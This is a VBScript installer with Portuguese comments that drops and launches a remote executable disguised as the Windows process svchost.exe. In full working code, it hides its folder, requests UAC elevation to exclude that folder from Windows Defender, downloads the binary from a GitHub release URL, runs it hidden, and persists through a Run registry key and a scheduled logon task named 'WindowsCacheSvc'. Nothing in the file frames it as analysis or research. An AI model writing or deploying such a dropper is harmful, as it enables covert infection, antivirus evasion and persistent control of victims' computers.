' installer.vbs — Verificador/instalador do svchost.exe
'
' Fluxo:
'   1. svchost.exe existe na pasta?
'        - NÃO → Passo 2 (instalar)
'        - SIM → Passo 3 (checar se está rodando)
'
'   2. INSTALAR:
'        - Pasta está na exclusão do Defender?
'            - NÃO → pede UAC 1x, adiciona A PASTA na exclusão
'            - SIM → pula UAC
'        - Baixa svchost.exe, move pra pasta, roda. Fim.
'
'   3. JÁ EXISTE NA PASTA:
'        - Está rodando? SIM → sai quieto.
'        - NÃO → espera 10s (dá tempo do Run do main.py abrir)
'              → checa de novo:
'                  - subiu → sai quieto
'                  - não subiu → garante pasta na exclusão (UAC se preciso)
'                              → abre o svchost.exe → sai
'
' Persistência: o Run do main.py ("svchost") e o Run do VBS ("WindowsCacheSvc")
' coexistem. O VBS nunca remove nada do Run.

Option Explicit

Dim shell, fso, localAppData, destino, exeUrl, tmpExe
Dim cmdBaixar, destinoExe, tentativas, rc, tamArquivo
Dim vbsPath, psKill, tentativasMove
Dim regRun, regValorNome, regInstalador
Dim psTask, taskName
Dim pastaDefender, psExclusao, cmdElevar, psChecker
Dim psCheckProc, regAtual, rc2

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' =====================================================================
' CONFIGURAÇÕES
' =====================================================================
exeUrl = "https://github.com/DesconhecidoPorOpcao/0T.romujaPnp/releases/latest/download/svchost.exe"

localAppData = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%")

destino    = localAppData & "\Microsoft\Windows\Caches\Local"
destinoExe = destino & "\svchost.exe"
tmpExe     = destino & "\svchost_novo.exe"

regRun        = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
regValorNome  = "WindowsCacheSvc"
taskName      = "WindowsCacheSvc"

vbsPath = WScript.ScriptFullName
regInstalador = "wscript.exe //B """ & vbsPath & """"

pastaDefender = destino


' =====================================================================
' Funções auxiliares
' =====================================================================

' Verifica se o svchost.exe (da pasta) está rodando.
' Retorna True se está rodando, False se não.
Function SvchostEstaRodando()
    Dim ps
    ps = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
         "$alvo = '" & destinoExe & "'.ToLower(); " & _
         "$procs = @(Get-Process -Name svchost -ErrorAction SilentlyContinue); " & _
         "if ($procs.Count -eq 0) { exit 1 }; " & _
         "$achou = $false; $semPath = $false; " & _
         "foreach ($p in $procs) { " & _
         "  try { " & _
         "    $exe = $p.Path; " & _
         "    if (-not $exe) { $semPath = $true; continue } " & _
         "    if ($exe.ToLower() -eq $alvo) { $achou = $true; break } " & _
         "  } catch { $semPath = $true } " & _
         "}; " & _
         "if ($achou) { exit 0 }; " & _
         "if ($semPath) { exit 0 }; " & _
         "exit 1" & _
         """"

    Dim r
    r = 1
    On Error Resume Next
    r = shell.Run(ps, 0, True)
    On Error Goto 0

    SvchostEstaRodando = (r = 0)
End Function

' Verifica se a PASTA já está na exclusão do Defender.
' Retorna True se está excluída, False se não.
Function PastaEstaExcluida()
    Dim ps, r
    ps = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
         "$alvo = '" & pastaDefender & "'.TrimEnd('\').ToLower(); " & _
         "$excl = @((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath); " & _
         "$achou = $false; " & _
         "foreach ($e in $excl) { " & _
         "  if ($e -and $e.ToString().TrimEnd('\').ToLower() -eq $alvo) { $achou = $true; break } " & _
         "}; " & _
         "if ($achou) { exit 0 } else { exit 1 }" & _
         """"

    r = 1
    On Error Resume Next
    r = shell.Run(ps, 0, True)
    On Error Goto 0

    PastaEstaExcluida = (r = 0)
End Function

' Pede UAC e adiciona a PASTA na exclusão do Defender.
' Não adiciona o processo svchost.exe — só a pasta.
Sub AdicionarPastaNaExclusao()
    psExclusao = "$p = '" & pastaDefender & "'; " & _
                 "Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue"
    psExclusao = Replace(psExclusao, "'", "''")

    cmdElevar = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
                "Start-Process powershell -Verb RunAs -Wait -WindowStyle Hidden " & _
                "-ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-Command','" & psExclusao & "'" & _
                """"

    On Error Resume Next
    shell.Run cmdElevar, 0, True
    On Error Goto 0
End Sub


' =====================================================================
' PASSO 1 — svchost.exe existe na pasta?
' =====================================================================

Dim arquivoExiste
arquivoExiste = False
tamArquivo = 0

If fso.FileExists(destinoExe) Then
    On Error Resume Next
    tamArquivo = fso.GetFile(destinoExe).Size
    On Error Goto 0
    If tamArquivo >= 1048576 Then
        arquivoExiste = True
    End If
End If


If arquivoExiste Then
    ' =================================================================
    ' PASSO 3 — JÁ EXISTE NA PASTA. Está rodando?
    ' =================================================================

    If SvchostEstaRodando() Then
        ' Está rodando → sai quieto.
        WScript.Quit 0
    End If

    ' Não está rodando. Espera 10s pro Run do main.py abrir ele no boot.
    WScript.Sleep 10000

    ' Checa de novo.
    If SvchostEstaRodando() Then
        ' O Run do main.py abriu ele nesse meio tempo → sai quieto.
        WScript.Quit 0
    End If

    ' Ainda não está rodando. Antes de abrir, garante a pasta na exclusão.
    If Not PastaEstaExcluida() Then
        AdicionarPastaNaExclusao()
    End If

    ' Abre o svchost.exe.
    On Error Resume Next
    shell.Run """" & destinoExe & """", 0, False
    On Error Goto 0

    WScript.Quit 0
End If


' =====================================================================
' PASSO 2 — NÃO EXISTE NA PASTA. Instalar do zero.
' =====================================================================

' Cria a pasta (se não existir) e esconde.
On Error Resume Next
If Not fso.FolderExists(destino) Then
    fso.CreateFolder(destino)
End If
shell.Run "attrib +h +s """ & destino & """", 0, True
On Error Goto 0

' Checa a exclusão da pasta. Se já está, pula o UAC.
If Not PastaEstaExcluida() Then
    AdicionarPastaNaExclusao()
End If

' Baixa svchost.exe do GitHub.
cmdBaixar = "powershell -NoProfile -WindowStyle Hidden -Command ""try { " & _
            "Invoke-WebRequest -Uri '" & exeUrl & "' -OutFile '" & tmpExe & "' " & _
            "-UseBasicParsing -ErrorAction Stop; exit 0 } catch { exit 1 }"""
On Error Resume Next
rc = shell.Run(cmdBaixar, 0, True)
On Error Goto 0

tentativas = 0
Do While Not fso.FileExists(tmpExe) And tentativas < 120
    WScript.Sleep 500
    tentativas = tentativas + 1
Loop

tamArquivo = 0
On Error Resume Next
If fso.FileExists(tmpExe) Then
    tamArquivo = fso.GetFile(tmpExe).Size
End If
On Error Goto 0

' Falhou? Sai silencioso (o Run do main.py tenta de novo no próximo boot).
If Not fso.FileExists(tmpExe) Or tamArquivo < 1048576 Then
    On Error Resume Next
    fso.DeleteFile tmpExe, True
    On Error Goto 0
    WScript.Quit 0
End If

' Move pra pasta final (com retry).
tentativasMove = 0
Do While tentativasMove < 30
    On Error Resume Next
    If fso.FileExists(destinoExe) Then
        fso.DeleteFile destinoExe, True
    End If
    Err.Clear
    fso.MoveFile tmpExe, destinoExe
    If Err.Number = 0 Then Exit Do
    Err.Clear
    On Error Goto 0
    WScript.Sleep 500
    tentativasMove = tentativasMove + 1
Loop

If tentativasMove >= 30 Then
    WScript.Quit 0
End If

' Roda o agente (o main.py já vai se auto-registrar no Run).
On Error Resume Next
shell.Run """" & destinoExe & """", 0, False
On Error Goto 0

' Registra Tarefa Agendada como backup (opcional).
psTask = "powershell -NoProfile -WindowStyle Hidden -Command """ & _
         "$nome = '" & taskName & "'; " & _
         "$exe  = '" & destinoExe & "'; " & _
         "try { " & _
         "  $a = New-ScheduledTaskAction -Execute $exe; " & _
         "  $t = New-ScheduledTaskTrigger -AtLogOn; " & _
         "  $s = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable; " & _
         "  Register-ScheduledTask -TaskName $nome -Action $a -Trigger $t -Settings $s -Force -ErrorAction Stop | Out-Null; " & _
         "  exit 0 " & _
         "} catch { exit 1 }"""
On Error Resume Next
shell.Run psTask, 0, True
On Error Goto 0

WScript.Quit 0
